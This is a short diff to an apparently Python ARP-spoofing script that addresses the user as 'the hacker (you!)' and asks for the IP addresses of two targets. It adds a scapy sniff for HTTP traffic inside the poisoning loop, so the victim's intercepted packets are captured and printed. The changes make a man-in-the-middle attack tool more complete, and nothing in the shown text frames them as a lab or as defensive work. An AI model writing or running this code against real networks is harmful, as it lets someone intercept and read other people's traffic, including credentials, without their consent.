@@ -46,6 +46,8 @@ def attack():
         try:
             attack(gate_phys, victim_phys)
             time.sleep(1.5)
+            packets = sniff(filter='http')
+            print(packets)
         except KeyboardInterrupt:
             restore_ARP()
             break
@@ -53,8 +55,8 @@ def attack():
 # Get input from the hacker (you!)
 try:
     wireless_interface_type = raw_input("Enter Network Interface Type: ")
-    victim = raw_input("Enter Target IP Address: ")
-    gate = raw_input("Enter Router IP Address:")
+    victim = raw_input("Enter Target A's IP Address: ")
+    gate = raw_input("Enter Target B's Address:")
 except KeyboardInterrupt:
     print ("\n Keyboard Interrupt!")
     print ("Shutting down...")
